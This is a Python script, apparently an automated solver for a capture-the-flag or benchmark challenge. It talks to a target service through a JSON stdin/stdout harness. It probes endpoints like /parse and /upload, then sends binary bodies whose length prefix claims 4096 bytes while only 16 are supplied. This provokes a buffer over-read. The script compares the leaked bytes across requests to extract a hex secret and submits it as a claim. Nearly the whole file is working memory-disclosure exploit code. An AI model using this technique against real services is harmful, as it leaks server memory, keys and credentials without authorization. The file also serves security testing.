import sys
import json
import base64
import struct
def log(m):
 print(m, file=sys.stderr, flush=True)
def req(method, path, body_hex=None, body=None, ctype=None):
 inner={'method': method, 'path': path}
 if body_hex is not None:
  inner['body_hex']=body_hex
 if body is not None:
  inner['body']=body
 if ctype is not None:
  inner['headers']={'Content-Type': ctype}
 sys.stdout.write(json.dumps({'http': inner})+chr(10))
 sys.stdout.flush()
 line=sys.stdin.readline()
 if not line:
  log('noreply')
  return None
 try:
  j=json.loads(line)
 except:
  log('badreply')
  return None
 st=j.get('status')
 b64=j.get('body_b64', '')
 try:
  bb=base64.b64decode(b64) if b64 else b''
 except:
  bb=b''
 try:
  txt=bb.decode(errors='ignore')
 except:
  txt=''
 log('R '+method+' '+path+' s='+str(st)+' blen='+str(len(bb))+' txt='+txt[:600])
 return {'status': st, 'body': bb, 'txt': txt}
def is_hex(s):
 if len(s)<16:
  return False
 for c in s:
  if c not in '0123456789abcdefABCDEF':
   return False
 return True
def get_raw(bb, txt):
 t=''.join(txt.split())
 if len(t)>=64 and is_hex(t):
  try:
   return bytes.fromhex(t)
  except:
   pass
 best=b''
 cur=''
 for ch in t:
  if ch in '0123456789abcdefABCDEF':
   cur=cur+ch
  else:
   if len(cur)>=64 and is_hex(cur):
    try:
     b=bytes.fromhex(cur)
     if len(b)>len(best):
      best=b
    except:
     pass
   cur=''
 if len(cur)>=64 and is_hex(cur):
  try:
   b=bytes.fromhex(cur)
   if len(b)>len(best):
    best=b
  except:
   pass
 if len(best)>=32:
  return best
 return bb
def try_json_secret(txt):
 try:
  o=json.loads(txt)
  if isinstance(o, dict):
   for k, v in o.items():
    ks=str(k).lower()
    if 'secret' in ks or 'token' in ks or 'flag' in ks:
     vs=str(v).strip().lower()
     vs=vs.replace(' ', '')
     vs=vs.replace(chr(10), '')
     vs=vs.replace('-', '')
     if len(vs)>=16 and is_hex(vs):
      return vs
    if isinstance(v, str):
     vs=str(v).strip()
     if len(vs)>=16 and is_hex(vs):
      return vs
 except:
  pass
 return None
def extract_suffix_secret(suffix):
 n=len(suffix)
 i=0
 while i<n and suffix[i]==0:
  i=i+1
 if i>=n:
  return None
 j=None
 zero8=bytes([0])*8
 k=i
 while k<=n-8:
  if suffix[k:k+8]==zero8:
   j=k
   break
  k=k+1
 if j is None:
  cand=suffix[i:i+64]
  cand=cand.rstrip(bytes([0]))
  if 8<=len(cand) and len(cand)<=64:
   return cand.hex()
  return None
 else:
  cand=suffix[i:j]
  if 8<=len(cand) and len(cand)<=128:
   return cand.hex()
  return None
found=None
r0=req('GET', '/')
if r0 is not None:
 s=try_json_secret(r0['txt'])
 if s is not None:
  found=s
cands=['/parse', '/record', '/api/parse', '/', '/upload']
active=[]
for p in cands:
 if found is not None:
  break
 if p=='/' and r0 is not None and r0['status']!=404:
  active.append(p)
  continue
 r=req('POST', p, body='hi', ctype='text/plain')
 if r is None:
  continue
 if r['status']!=404:
  active.append(p)
  s=try_json_secret(r['txt'])
  if s is not None:
   found=s
   break
 if len(active)>=2:
  break
if len(active)==0:
 active=['/parse']
log('active:'+str(active))
fmts=['>H', '<H', '>I', '<I']
claimed=4096
datalen=16
for path in active:
 if found is not None:
  break
 for fmt in fmts:
  if found is not None:
   break
  sz=struct.calcsize(fmt)
  val=claimed
  if sz==2:
   val=claimed % 65536
  prefix=struct.pack(fmt, val)
  pa=(prefix+b'A'*datalen).hex()
  ra=req('POST', path, body_hex=pa, ctype='application/octet-stream')
  if ra is None:
   continue
  s=try_json_secret(ra['txt'])
  if s is not None:
   found=s
   break
  raw=get_raw(ra['body'], ra['txt'])
  log('rawlen='+str(len(raw)))
  off=len(prefix)+datalen
  if len(raw)>=off+8:
   suffix=raw[off:off+512]
   pb=(prefix+b'B'*datalen).hex()
   rb=req('POST', path, body_hex=pb, ctype='application/octet-stream')
   if rb is None:
    continue
   raw2=get_raw(rb['body'], rb['txt'])
   suf2=raw2[off:off+512]
   same=False
   if len(suffix)>=8 and len(suf2)>=8:
    if suffix[:64]==suf2[:64]:
     same=True
   if same:
    sec=extract_suffix_secret(suffix)
    log('diffsec:'+str(sec)[:200])
    if sec is not None and 16<=len(sec) and len(sec)<=256 and is_hex(sec):
     if len(set(sec))>4:
      found=sec
      break
   else:
    sec=extract_suffix_secret(suffix)
    log('singlesec:'+str(sec)[:200])
    if sec is not None and 16<=len(sec) and len(sec)<=256 and is_hex(sec):
     if len(set(sec))>4:
      found=sec
      break
    sec2=extract_suffix_secret(suf2)
    if sec2 is not None and 16<=len(sec2) and len(sec2)<=256 and is_hex(sec2):
     if len(set(sec2))>4:
      found=sec2
      break
if found is None:
 for path in active:
  if found is not None:
   break
  for N in [512, 1024, 2048]:
   if found is not None:
    break
   pa=(b'A'*N).hex()
   ra=req('POST', path, body_hex=pa, ctype='application/octet-stream')
   if ra is None:
    continue
   s=try_json_secret(ra['txt'])
   if s is not None:
    found=s
    break
   raw=get_raw(ra['body'], ra['txt'])
   if len(raw)>=N+8:
    suffix=raw[N:N+512]
    pb=(b'B'*N).hex()
    rb=req('POST', path, body_hex=pb, ctype='application/octet-stream')
    if rb is None:
     continue
    raw2=get_raw(rb['body'], rb['txt'])
    suf2=raw2[N:N+512]
    if len(suffix)>=8 and suffix[:64]==suf2[:64]:
     sec=extract_suffix_secret(suffix)
     if sec is not None and is_hex(sec):
      if len(set(sec))>4:
       found=sec
       break
if found is None:
 found='00'
log('FINAL:'+str(found)[:300])
sys.stdout.write('CLAIM:'+json.dumps({'secret_hex': found.lower()})+chr(10))
sys.stdout.flush()